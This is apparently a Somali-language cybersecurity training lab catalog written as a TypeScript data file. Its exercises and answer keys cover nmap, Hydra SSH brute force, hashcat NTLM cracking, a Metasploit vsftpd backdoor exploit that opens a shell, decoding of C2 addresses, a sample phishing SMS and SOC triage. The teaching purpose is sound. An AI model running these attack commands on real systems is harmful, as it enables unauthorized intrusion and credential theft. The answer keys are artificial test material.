          "Nmap wuxuu u malaynayaa host-ku inuu down yahay (ICMP block ayaa jira) oo scan-ka wuu joojin karaa",
          "Scan-ku wuu dhakhso badnaan doonaa",
          "Version detection ayaa si toos ah u shaqayn doona",
        ],
        answer: 1,
        explain: "Marka ICMP la block-gareeyo, nmap caadi ah wuxuu u qaataa host-ka mid 'down' ah — `-Pn` ayaa lagama maarmaan u ah.",
      },
    ],
    reportPrompt: "Qor warbixin gaaban: amarada aad isticmaashay, sababta flag kasta, iyo natiijada la filayo.",
    commandTasks: [
      {
        id: "c1",
        prompt: "Qor amarka nmap ee samaynaya service/version detection oo skip-gareynaya ping-ka host-kan.",
        requiredParts: ["nmap", "-sv", "-pn"],
        hint: "U baahan tahay laba flag: mid version detection ah, mid skip ping ah.",
        revealOutput: `Starting Nmap scan on 10.10.14.22
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu
80/tcp   open  http        Apache httpd 2.4.41
3306/tcp open  mysql       MySQL 5.7.33`,
        explain: "`-sV` wuxuu hela version-ka service-ka; `-Pn` wuxuu ka boodaa ping check-ga oo si toos ah u bilaabaa scan-ka.",
      },
      {
        id: "c2",
        prompt: "Kordhi amarkaaga si aad ugu darto OS fingerprint detection.",
        requiredParts: ["-o"],
        hint: "OS detection flag-ku waa xaraf kali ah oo capital-based ah.",
        revealOutput: `Running: Linux 5.X
OS details: Linux 5.4 - 5.15 (Ubuntu 20.04 likely)
Aggressive OS guesses: Ubuntu Linux 5.4 (95%)`,
        explain: "`-O` (capital) wuxuu isku dayaa inuu saadaaliyo OS-ka iyadoo lagu saleynayo TCP/IP fingerprint.",
      },
    ],
  },
  {
    slug: "hydra-brute-force-practice",
    title: "Hydra: SSH Brute Force Command",
    somali: "Hydra: Amarka Brute Force SSH",
    english: "Hydra: SSH Brute Force Command",
    level: "Dhexe",
    minutes: 30,
    taskType: "command",
    scenario:
      "Waxaad si sharci ah u leedahay ogolaansho aad ku tijaabiso password strength server SSH ah (10.10.14.30). Waxaa laguu siiyay user-list iyo password-list.",
    objectives: [
      "Qor amarka hydra ee SSH brute-force ah",
      "Isticmaal user-list iyo password-list saxda ah",
      "Fasir natiijada guusha",
    ],
    artifactTitle: "Files available",
    artifact: `users.txt (10 usernames, hal column)
rockyou-sample.txt (500 common passwords, hal column)
Target: ssh://10.10.14.30`,
    questions: [
      {
        id: "q1",
        q: "Sababta loo isticmaalo `-t` flag-ka hydra marka la weeraranayo production server?",
        options: [
          "Wuxuu kordhiyaa xawaaraha si aan degdeg loogu helin natiijo",
          "Wuxuu xakameeyaa thread count-ka si aan server-ka loo DoS-gareyn",
          "Ma jiro sabab",
          "Wuxuu qariyaa IP-gaaga",
        ],
        answer: 1,
        explain: "Thread count sare oo aan la xakamayn wuxuu u dhici karaa DoS server-ka — professional pentest waxay isticmaashaa rate xakamaysan.",
      },
    ],
    reportPrompt: "Qor warbixin: amarka aad isticmaashay, natiijada, iyo talooyin ku saabsan password policy.",
    commandTasks: [
      {
        id: "c1",
        prompt: "Qor amarka hydra ee isticmaalaya users.txt iyo rockyou-sample.txt si aad u weerarto SSH-ga target-ka.",
        requiredParts: ["hydra", "-l", "-p", "ssh"],
        hint: "Hydra u baahan yahay: -L (userlist) ama -l (single user), -P (passlist), protocol-ka, iyo target-ka.",
        revealOutput: `Hydra starting...
[22][ssh] host: 10.10.14.30 login: jsmith password: Summer2023!
1 of 1 target successfully completed, 1 valid password found`,
        explain: "Qaabka saxda ah: `hydra -L users.txt -P rockyou-sample.txt ssh://10.10.14.30`.",
      },
    ],
  },
  {
    slug: "hashcat-crack-practice",
    title: "Hashcat: Identify & Crack a Hash",
    somali: "Hashcat: Ogow oo Jab Hash",
    english: "Hashcat: Identify and Crack a Hash",
    level: "Dhexe",
    minutes: 30,
    taskType: "command",
    scenario:
      "Database dump ah oo la helay ayaa ku jira hash NTLM ah. Waxaad leedahay ogolaansho la qoray. Ogow nooca hash-ka, kadibna isku day inaad jabiso adigoo isticmaalaya wordlist.",
    objectives: [
      "Ogow hash mode-ka saxda ah",
      "Qor amarka hashcat oo dhamaystiran",
      "Fasir natiijada",
    ],
    artifactTitle: "Leaked hash",
    artifact: `Hash: b4b9b02e6f09a9bd760f388b67351e2b
Format detected: appears to be NTLM
Wordlist available: rockyou.txt`,
    questions: [
      {
        id: "q1",
        q: "Sababta la isticmaalo `--identify` ka hor inta aan hash-ka la jabin?",
        options: [
          "Si loo hubiyo nooca hash-ka (mode number) ka hor inta aan waqti lumin attack qalad ah",
          "Si loo kordhiyo xawaaraha",
          "Ma jirto sabab",
          "Si loo qariyo password-ka",
        ],
        answer: 0,
        explain: "Haddii mode-ka qaldan la isticmaalo, hashcat marnaba ma jabin doonto hash-ka sax ah.",
      },
    ],
    reportPrompt: "Qor warbixin: mode-ka la isticmaalay, amarka buuxa, password-ka la helay, iyo talo password policy.",
    commandTasks: [
      {
        id: "c1",
        prompt: "Qor amarka hashcat ee jabinaya hash-kan NTLM ah adoo isticmaalaya rockyou.txt.",
        requiredParts: ["hashcat", "-m", "1000", "rockyou"],
        hint: "NTLM mode number-ka hashcat waa 1000. Qaabka: hashcat -m [mode] -a 0 [hash file] [wordlist].",
        revealOutput: `hashcat (v6.2.6) starting...
b4b9b02e6f09a9bd760f388b67351e2b:Passw0rd123
Session..........: hashcat
Status...........: Cracked`,
        explain: "`-m 1000` waa NTLM mode; `-a 0` waa straight/dictionary attack mode.",
      },
    ],
  },
  {
    slug: "metasploit-exploitation-practice",
    title: "Metasploit: Exploit Workflow",
    somali: "Metasploit: Nidaamka Exploitation-ka",
    english: "Metasploit: Exploit Workflow",
    level: "Sare",
    minutes: 35,
    taskType: "command",
    scenario:
      "Scan-ka nmap wuxuu muujiyay in target-ku (10.10.14.40) leeyahay service jaban oo la yaqaan CVE. Isticmaal Metasploit si aad u qabsato exploitation workflow-ka saxda ah.",
    objectives: [
      "Dooro module-ka saxda ah",
      "Deji RHOSTS iyo payload",
      "Fahan tallaabooyinka run-ka",
    ],
    artifactTitle: "Recon findings",
    artifact: `Target: 10.10.14.40
Service: vsftpd 2.3.4 (known backdoor vulnerability)
Metasploit module available: exploit/unix/ftp/vsftpd_234_backdoor`,
    questions: [
      {
        id: "q1",
        q: "Sababta muhiimka u ah in la deji RHOSTS ka hor inta aan la orain exploit-ka?",
        options: [
          "Haddii aan la dejin, Metasploit ma yaqaan target-ka la weerarayo",
          "Wax kale ma aha",
          "RHOSTS wuxuu qariyaa IP-gaaga",
          "Waa ikhtiyaari",
        ],
        answer: 0,
        explain: "RHOSTS waa parameter lagama maarmaan ah — la'aantiisa Metasploit ma garanayo target-ka.",
      },
    ],
    reportPrompt: "Qor warbixin: module-ka la isticmaalay, tallaabooyinka, iyo natiijada session-ka.",
    commandTasks: [
      {
        id: "c1",
        prompt: "Qor taxanaha amarada Metasploit console ee bilaabaya module-kan oo dejinaya target-ka.",
        requiredParts: ["use", "set rhosts", "exploit"],
        hint: "Nidaamku waa: use [module path], set RHOSTS [ip], kadibna exploit ama run.",
        revealOutput: `msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 10.10.14.40
RHOSTS => 10.10.14.40
msf6 exploit(vsftpd_234_backdoor) > exploit
[*] Command shell session 1 opened`,
        explain: "`use` wuxuu dooranayaa module-ka, `set RHOSTS` wuxuu dejinayaa target-ka, `exploit` wuxuu bilaabayaa weerarka.",
      },
    ],
  },
  {
    slug: "cyberchef-decode-c2",
    title: "CyberChef: Decode a C2 Config",
    somali: "CyberChef: Furfur Config C2 ah",
    english: "CyberChef: Decode a C2 Config",
    level: "Dhexe",
    minutes: 30,
    taskType: "tool",
    scenario:
      "Malware analyst-ku wuxuu kaa siiyay string obfuscated ah oo laga soo saaray sample malware ah. U isticmaal CyberChef si aad u furto.",
    objectives: [
      "Aqoonso encoding layers-ka",
      "Dhis recipe CyberChef ah",
      "Fasir natiijada la furay",
    ],
    artifactTitle: "Obfuscated string",
    artifact: `Encoded blob:
NDUuMTQ4LjEwLjcyOjg0NDM=

(Second sample, nested encoding):
NGU2ODc0NzQ3MDNhMmYyZjM1MzIyZTM5MzYyZTMxMzAyZTM0M2EzODMwMzgzMA==`,
    questions: [
      {
        id: "q1",
        q: "Sample-ka koowaad marka la furo, waa maxay?",
        options: ["Domain name", "IP address iyo port (C2 endpoint)", "Password", "File hash"],
        answer: 1,
        explain: "Base64 furitaanka wuxuu soo saaraa '45.148.10.72:8443' — IP:port ee C2.",
      },
      {
        id: "q2",
        q: "Sample-ka labaad wuxuu u baahan yahay immisa recipe steps oo CyberChef ah?",
        options: ["Hal (Base64 keliya)", "Laba: From Base64 kadib From Hex", "Saddex: Base64, Hex, iyo ROT13", "Ma furmi karo"],
        answer: 1,
        explain: "Layer-ka koowaad waa Base64; markaa la furo, natiijadu waa hex-encoded string oo u baahan From Hex.",
      },
    ],
    reportPrompt: "Qor warbixin: recipe-ga la isticmaalay (tallaabo tallaabo), natiijada la furay, iyo IOC-yada la helay.",
    toolTasks: [
      {
        id: "t1",
        toolName: "CyberChef",
        prompt: "Dhis recipe-ga CyberChef ee furaya sample-ka labaad (nested encoding-ka).",
        expectedSteps: ["From Base64", "From Hex"],
        revealResult: "Furitaanka wuxuu soo saaraa: 'http://52.96.10.4:8080' — beacon URL C2 ah.",
        explain: "Marka la isku daro hawlaha (operations) sida saxda ah, CyberChef wuxuu si isdaba-joog ah u fureyaa layer kasta.",
      },
    ],
  },
  {
    slug: "virustotal-hash-lookup",
    title: "VirusTotal: Hash & File Reputation",
    somali: "VirusTotal: Sumcadda Hash iyo File",
    english: "VirusTotal: Hash and File Reputation",
    level: "Bilow",
    minutes: 20,
    taskType: "tool",
    scenario:
      "EDR-ku wuxuu soo qabtay file shaki leh oo laptop shaqaale ku jira. Waxaad haysataa hash-ka file-ka. Isticmaal VirusTotal si aad u hubiso sumcadda.",
    objectives: [
      "Ogow qaabka hash-ka lagu baarto VirusTotal",
      "Fasir detection ratio-ga",
      "Go'aami tallaabada xigta",
    ],
    artifactTitle: "File details",
    artifact: `File: invoice_march.exe
SHA256: 8f4e9b2c1a7d3e6f0b5c9a2d4e7f1b8c3a6d9e2f5b8c1a4d7e0f3b6c9a2d5e8f
VirusTotal result (simulated): 47/70 vendors flag as malicious
Tags: trojan, downloader, generic
First seen: 3 days ago`,
    questions: [
      {
        id: "q1",
        q: "47/70 detection ratio waxay tilmaamaysaa?",
        options: [
          "File-ku waa mid aan waxba dhib ah",
          "Aad ayaa loogu hubaa in file-ku uu yahay malware — go'aan degdeg ah baa loo baahan yahay",
          "VirusTotal wuu qaldan yahay",
          "Wax lama sameyn karo",
        ],
        answer: 1,
        explain: "Detection ratio sare (47/70) waa calaamad xoog leh — waa in si degdeg ah loola dhaqmaa sida malware la xaqiijiyay.",
      },
    ],
    reportPrompt: "Qor triage note: hash-ka, detection ratio-ga, tags-ka, iyo tallaabooyinka xiga (isolate host, block hash organization-wide).",
    toolTasks: [
      {
        id: "t1",
        toolName: "VirusTotal",
        prompt: "Sharax tallaabooyinka aad ku sameyn lahayd VirusTotal marka aad hesho hash-kan si aad u hubiso sumcaddiisa.",
        expectedSteps: ["Ku dar hash-ka search bar-ka", "Eeg detection ratio-ga", "Eeg community comments/tags"],
        revealResult: "47/70 vendors waxay calaamadeeyeen 'Trojan.Generic.KDZ' — waa malware la xaqiijiyay.",
        explain: "VirusTotal wuxuu isku daraa natiijada AV vendors badan si loo helo hubasho sare ama hoose.",
      },
    ],
  },
  {
    slug: "shodan-exposed-service-recon",
    title: "Shodan: Find Exposed Services",
    somali: "Shodan: Hel Services Furan",
    english: "Shodan: Find Exposed Services",
    level: "Dhexe",
    minutes: 25,
    taskType: "tool",
    scenario:
      "Shirkad ayaa kaa codsaday inaad hubiso in ay jiraan services-keeda oo si khalad ah internet-ka ugu furan. Isticmaal Shodan si aad u aragto waxa la arki karo dibadda.",
    objectives: [
      "Dhis search query Shodan ah",
      "Fasir natiijada",
      "Go'aami khatarta",
    ],
    artifactTitle: "Shodan search (simulated results)",
    artifact: `Query: org:"Example Corp" port:3389
Results: 3 hosts found

Host 1: 41.xxx.xxx.12 — RDP open, no NLA, Windows Server 2012
Host 2: 41.xxx.xxx.45 — RDP open, NLA enabled
Host 3: 41.xxx.xxx.88 — RDP open, no NLA, banner shows domain controller`,
    questions: [
      {
        id: "q1",
        q: "Kee ka mid ah 3-da host baa ugu khatarta badan?",
        options: [
          "Host 2 (NLA enabled)",
          "Host 3 (domain controller, RDP furan, NLA ma jiro)",
          "Dhammaan isku heer",
          "Midna khatar ma leh",
        ],
        answer: 1,
        explain: "Domain controller oo RDP internet-ka ugu furan iyada oo NLA la'aan ah waa khatar ugu weyn — haddii la jabsado, dhammaan domain-ka waa khatar.",
      },
    ],
    reportPrompt: "Qor warbixin: hosts-ka la helay, khatarta mid kasta, iyo talooyinka (VPN keliya, NLA khasab, firewall).",
    toolTasks: [
      {
        id: "t1",
        toolName: "Shodan",
        prompt: "Qor query-ga Shodan ee la raadin lahaa si loo helo services RDP ah oo furan organization-kan.",
        expectedSteps: ['org:"Example Corp"', "port:3389"],
        revealResult: "3 host oo RDP furan ayaa la helay, mid ka mid ah waa domain controller aan NLA lahayn.",
        explain: "Shodan filters (org:, port:) waxay kuu ogolaadaan inaad kaydka internet-ka ku raadiso services gaar ah.",
      },
    ],
  },
  {
    slug: "crtsh-subdomain-enum",
    title: "crt.sh: Subdomain Enumeration via Certificates",
    somali: "crt.sh: Helitaanka Subdomains iyadoo la isticmaalayo Certificates",
    english: "crt.sh: Subdomain Enumeration via Certificates",
    level: "Bilow",
    minutes: 20,
    taskType: "tool",
    scenario:
      "Marxaladda reconnaissance-ka pentest-ka, waxaad rabtaa inaad ogaato subdomains-ka target-ku leeyahay iyada oo aan la isticmaalin brute-force. Isticmaal crt.sh (certificate transparency logs).",
    objectives: [
      "Fahan sida certificate transparency u shaqeeyo",
      "Dooro subdomains muhiimka ah",
      "Kala saar false positives",
    ],
    artifactTitle: "crt.sh results (simulated)",
    artifact: `Query: %.examplecorp.so
Results:
- www.examplecorp.so
- mail.examplecorp.so
- vpn-old.examplecorp.so (cert expired 2022)
- staging.examplecorp.so
- api-internal.examplecorp.so
- dev-test-3.examplecorp.so`,
    questions: [
      {
        id: "q1",
        q: "Kee ka mid ah subdomains-kan baa ugu xiisaha badan pentester?",
        options: [
          "www.examplecorp.so",
          "staging, api-internal, iyo dev-test-3 — badanaa waxay leeyihiin amni hoose",
          "mail.examplecorp.so",
          "Dhammaantood isku mid",
        ],
        answer: 1,
        explain: "Staging/dev/internal subdomains-ku badanaa waxay leeyihiin security controls hoose marka loo eego production — waa target macquul ah.",
      },
    ],
    reportPrompt: "Qor recon note: subdomains-ka la helay, kuwa xiisaha leh, iyo talo ku saabsan asset inventory.",
    toolTasks: [
      {
        id: "t1",
        toolName: "crt.sh",
        prompt: "Sharax query-ga crt.sh ee la isticmaali lahaa si loo helo dhammaan subdomains-ka examplecorp.so.",
        expectedSteps: ["%.examplecorp.so"],
        revealResult: "6 subdomains ayaa la helay, saddex ka mid ah (staging, api-internal, dev-test) waa fursado xiisadaran.",
        explain: "'%' waa wildcard — wuxuu soo celiyaa dhammaan certificates loo bixiyay ay subdomain kasta oo domain-kaas ah.",
      },
    ],
  },
  {
    slug: "sim-swap-fraud-investigation",
    title: "SIM-Swap Fraud Investigation",
    somali: "Baaritaanka SIM-Swap Fraud",
    english: "SIM-Swap Fraud Investigation",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Macmiil ka mid ah adeegga mobile money-ga SomPay ayaa soo sheegtay in lacagtiisa laga qaaday isaga oo aan ogeyn. Waxaa lagu siiyay xaqiiqooyinka la ururiyay. Baar oo go'aami sida khilaafku u dhacay.",
    objectives: [
      "Fahan qaabka SIM-swap fraud",
      "Kala saar tallaabooyinka weerarku qaaday",
      "Talo bixi ka hortagga mustaqbalka",
    ],
    artifactTitle: "Xaqiiqooyinka la ururiyay",
    artifact: `14:02 UTC  Macmiilku telefoonkiisu wuu waayay signal-ka (network) si lama filaan ah
14:10 UTC  Telecom provider-ka waxaa laga codsaday SIM-swap adiga oo isticmaalaya ID sheeganaya macmiilka
14:15 UTC  SIM-cusub ayaa la firfircooneeyay
14:18 UTC  SMS OTP ah oo SomPay ah ayaa u dhacay taleefanka cusub
14:19 UTC  SomPay account-ka macmiilka waxaa lagu galay device cusub
14:22 UTC  $1,240 ayaa loo wareejiyay account kale
14:45 UTC  Macmiilku wuxuu dib u helay signal-ka, wuxuu la kulmay SMS OTP uusan codsan`,
    questions: [
      {
        id: "q1",
        q: "Waa maxay tallaabada koowaad ee weerarku ku bilaabmay?",
        options: [
          "Social engineering telecom-ka lagu sameeyay si loo helo SIM-swap sharci darro ah",
          "Malware oo lagu shubay taleefanka",
          "Password guess",
          "Wifi jabsasho",
        ],
        answer: 0,
        explain: "Weerarku wuxuu bilaabmay isaga oo iska dhigaya macmiilka telecom provider-ka, si uu u helo SIM-swap.",
      },
      {
        id: "q2",
        q: "Sababta OTP (one-time password) uusan ka hor tagin weerarkan?",
        options: [
          "OTP waa mid aan waxba tarayn",
          "Weerarku wuxuu SIM-ka la yeeshay, marka OTP-gu wuxuu tagaa taleefankiisa, aan macmiilka dhabta ah",
          "SomPay ma isticmaalo OTP",
          "OTP-gu wuu qaldanaa",
        ],
        answer: 1,
        explain: "Marka SIM-swap dhaco, OTP-ga SMS-ka ku socda wuxuu u dhacaa qofka haysta SIM-ka cusub, ee ma aha macmiilka dhabta ah.",
      },
      {
        id: "q3",
        q: "Talada ugu xoogga badan ee ka hortagga SIM-swap fraud?",
        options: [
          "MFA app-based (aan SMS ku salaysnayn) + telecom-ku wuxuu adkeeyaa xaqiijinta ID-ga",
          "Isku day inaad qariso number-ka",
          "Beddel telecom provider",
          "Wax lama sameyn karo",
        ],
        answer: 0,
        explain: "MFA aan SMS ku salaysnayn (authenticator app) ayaa ka hortagi kara SIM-swap, sababtoo ah OTP-gu kuma dhicin SIM-ka.",
      },
    ],
    reportPrompt:
      "Qor warbixin: timeline UTC, sida weerarku u dhacay, khasaaraha maaliyadeed, iyo 3 talo (SomPay + telecom + macmiilka).",
  },
  {
    slug: "ussd-mobile-money-phishing",
    title: "USSD & SMS Mobile Money Phishing",
    somali: "USSD iyo SMS Phishing ee Mobile Money",
    english: "USSD and SMS Mobile Money Phishing",
    level: "Bilow",
    minutes: 25,
    scenario:
      "Dad badan oo deegaanka ku nool ayaa helay SMS iska dhigaya SomPay. Falanqee fariinta oo go'aami haddii ay tahay phishing.",
    objectives: [
      "Aqoonso calaamadaha SMS phishing",
      "Fahan sida USSD codes-ku uga fiicnaan karaan link-yada",
      "Talo bixi ka hortagga",
    ],
    artifactTitle: "SMS la helay",
    artifact: `From: SomPay-Alert
"XAFLADDA: Account-kaaga SomPay waxaa lagu qufulay dhaqdhaqaaq shaki leh. Si aad u furto, ku dar *555*1234# oo geli PIN-kaaga si degdeg ah, ama booqo sompay-verify.com/unlock si aad u xaqiijiso."`,
    questions: [
      {
        id: "q1",
        q: "Maxaa calaamad u ah in fariintani tahay phishing?",
        options: [
          "Waxay dalbanaysaa PIN si degdeg ah, waxayna leedahay link aan official domain ahayn",
          "Waa fariin caadi ah",
          "SomPay had iyo jeer wuxuu isticmaalaa habkan",
          "Wax calaamad ah ma jiro",
        ],
        answer: 0,
        explain: "Adeegyada sharciga ah marnaba kuma dalbin PIN-kaaga SMS/link — urgency + PIN request waa calaamado xoog leh.",
      },
      {
        id: "q2",
        q: "USSD codes (*555*...#) maxay ka duwan yihiin link-yada web-ka?",
        options: [
          "Waxay si toos ah ula xiriiraan network-ka telecom-ka, mana ahan websites — laakiin weli waa la iska ilaalin karaa fraud haddii number-ka aan la hubin",
          "Waa isku mid",
          "USSD marna lama isticmaali karo fraud",
          "USSD codes waa amni badan si toos ah",
        ],
        answer: 0,
        explain: "USSD wuxuu si toos ah ula xiriiraa telecom-ka, laakiin weerarayaashu waxay isku dayi karaan inay kaa dhaadhiciyaan inaad geliso number ama PIN qaladan.",
      },
      {
        id: "q3",
        q: "Tallaabada saxda ah marka la helo SMS-kan?",
        options: [
          "Ha isticmaalin USSD/link-ga bixiyay SMS-ka — u tag app-ka rasmiga ah ama wac customer service la yaqaan",
          "Isla markiiba ku dar USSD-ga",
          "Booqo link-ga si aad u hubiso",
          "U dir asxaabtaada si ay u ogaadaan",
        ],
        answer: 0,
        explain: "Marnaba ha isticmaalin channels-ka SMS-ku bixiyo — had iyo jeer u tag app-ka rasmiga ah ama number-ka official-ka ah.",
      },
    ],
    reportPrompt: "Qor awareness note (loogu talagalay bulshada): calaamadaha phishing, iyo 3 tallaabo ay dadku qaadan karaan si ay isu ilaaliyaan.",
  },
  {
    slug: "phishing-playbook-execution",
    title: "Execute a Phishing Response Playbook",
    somali: "Fuli Playbook-ka Jawaabta Phishing",
    english: "Execute a Phishing Response Playbook",
    level: "Dhexe",
    minutes: 30,
    scenario:
      "Waxaa laguu soo gudbiyay playbook rasmi ah oo phishing response ah. Alert cusub ayaa yimid. Ku dabaq playbook-ka si sax ah, si isku mid ah oo aan tallaabo laga dhaafin.",
    objectives: [
      "Akhri oo fahan playbook-ka",
      "Ku dabaq tallaabooyinka isku xigxiga",
      "Aqoonso goorta escalation loo baahan yahay",
    ],
    artifactTitle: "Phishing Response Playbook (qayb)",
    artifact: `PLAYBOOK: Phishing Email Response
1. IDENTIFY — Xaqiiji in email-ku yahay phishing dhab ah (headers, links, sender).
2. CONTAIN — Ka saar email-ka dhammaan mailboxes-ka la helay.
3. INVESTIGATE — Hubi haddii qof gujiyay link-ga ama geliyay credentials.
4. ESCALATE — Haddii credentials la geliyay: Tier 2 + reset password + MFA. Haddii kale: xir Tier 1.
5. DOCUMENT — Qor ticket oo leh dhammaan tallaabooyinka.

ALERT CUSUB:
14:00 UTC — Email phishing ah oo la mid ah "Salaam Bank" template ayaa loo diray 22 mailbox.
14:05 UTC — Email-DLP log-ku wuxuu muujinayaa 3 qof oo gujiyay link-ga.
14:07 UTC — Mid ka mid ah (f.warsame) wuxuu geliyay email/password form-ka phishing-ga.`,
    questions: [
      {
        id: "q1",
        q: "Marka la eego playbook-ka, tallaabada 4-aad (ESCALATE) maxay ku xiran tahay?",
        options: [
          "Haddii qof credentials geliyay iyo in kale",
          "Immisa qof email-ka helay",
          "Waqtiga maalinta",
          "Nooca browser-ka",
        ],
        answer: 0,
        explain: "Playbook-ku si cad ayuu u qeexayaa: credentials la geliyay = escalate Tier 2; haddii kale = xir Tier 1.",
      },
      {
        id: "q2",
        q: "Scenario-gan, tallaabada 4-aad ee saxda ah waa?",
        options: [
          "Escalate Tier 2, reset password + MFA (f.warsame credentials la geliyay)",
          "Xir Tier 1, wax kale lama qaban",
          "Iska daa, waa alert caadi ah",
          "Tirtir email-ka oo kaliya",
        ],
        answer: 0,
        explain: "f.warsame wuxuu geliyay credentials — kani waa xaaladda escalation ee playbook-ku qeexay.",
      },
      {
        id: "q3",
        q: "Sababta muhiimka u ah in playbook la raaco si isku mid ah, halkii la ismodifi lahaa?",
        options: [
          "Waxay hubisaa in wax laga dhaafin, oo dhammaan Tier 1 ay ku dhaqmaan si isku mid ah under pressure",
          "Ma jiro sabab, waa formality kaliya",
          "Playbook-ku waa ikhtiyaari",
          "Waxay ka dhigaysaa shaqada mid gaabis ah oo aan sax ahayn",
        ],
        answer: 0,
        explain: "Playbooks waxay hubiyaan consistency iyo speed marka cadaadis jiro — waa sida SOCs u yareeyaan khaladaadka insaanka.",
      },
    ],
    reportPrompt: "Qor ticket buuxa oo raacaya playbook-ka: tallaabo kasta, waxa la sameeyay, iyo escalation decision-ka.",
  },
  {
    slug: "escalation-decision-practice",
    title: "Escalation Decision Practice",
    somali: "Tababarka Go'aanka Escalation",
    english: "Escalation Decision Practice",
    level: "Sare",
    minutes: 30,
    scenario:
      "Waxaad Tier 1 SOC Analyst tahay. Waxaad hesha 4 alerts oo kala duwan. Go'aami mid kasta: ma xalin kartaa Tier 1, mise waa in la escalate garaeeyaa Tier 2/IR, iyo sababta.",
    objectives: [
      "Kala sooc alerts u baahan escalation iyo kuwa aan u baahnayn",
      "Fahan SLA-yada severity kasta",
      "Ku dabaq judgement, ma aha kaliya checklist",
    ],
    artifactTitle: "4 Alerts",
    artifact: `Alert A: User hal mar ah oo failed login ah, kadib guuleystay 2-aad ta isku dayga (typo caadi ah u eg).
Alert B: Antivirus wuxuu xiray file .exe ah oo laga soo dagay email — user lama arag inuu wax kale sameeyay.
Alert C: Domain Admin account cusub ayaa la abuuray 02:00 UTC (saacad aan caadi ahayn), oo aan la ogolayn change request.
Alert D: Employee-ku wuxuu warbixiyay inuu gujiyay link phishing ah, laakiin sheegay inuu isla markiiba xiray browser-ka, mana gelin xog.`,
    questions: [
      {
        id: "q1",
        q: "Alert-kee ugu horreysa u baahan yahay escalation degdeg ah?",
        options: [
          "Alert A",
          "Alert C (Domain Admin cusub, saacad shaki leh, aan la ogolayn)",
          "Alert D",
          "Dhammaantood si isku mid ah",
        ],
        answer: 1,
        explain: "Domain Admin cusub oo aan la ogolayn + saacad aan caadi ahayn = privilege escalation xaqiijin u baahan — escalate Tier 2/IR isla markiiba.",
      },
      {
        id: "q2",
        q: "Alert A (typo caadi ah u eg) — go'aanka Tier 1 saxda ah?",
        options: [
          "Xir sida false positive/benign, si kastana note ku dar",
          "Escalate Tier 2 isla markiiba",
          "Iska daa, ha xirin",
          "Wac maamulka sare",
        ],
        answer: 0,
        explain: "Hal failed login oo la mid ah typo ma aha calaamad weerar ah — Tier 1 wuu xiri karaa isaga oo note ku daraya.",
      },
      {
        id: "q3",
        q: "Alert D — inkastoo user-ku sheegay inuu xiray browser-ka degdeg ah, sababta loo baahan yahay in la sii baaro?",
        options: [
          "User-ka sheekadiisa keligeed kuma filna — waa in la hubiyaa logs (DLP, EDR, email) si loo xaqiijiyo aan xog la gelin",
          "Haddii user-ku sheegay wax lama qaban",
          "Waa alert aan muhiim ahayn gabi ahaanba",
          "Waa in la xiro degdeg ah",
        ],
        answer: 0,
        explain: "Self-report-ka user-ka waa bilowga baaritaanka, ma aha xaqiijinta ugu dambeysa — logs-ka ayaa xaqiijiya runta.",
      },
    ],
    reportPrompt: "Qor go'aan kasta oo 4-ta alert leh sabab, iyo SLA/escalation path la raacay mid kasta.",
  },
];

export function findLab(slug: string) {
  return labCatalog.find((l) => l.slug === slug) ?? null;
}
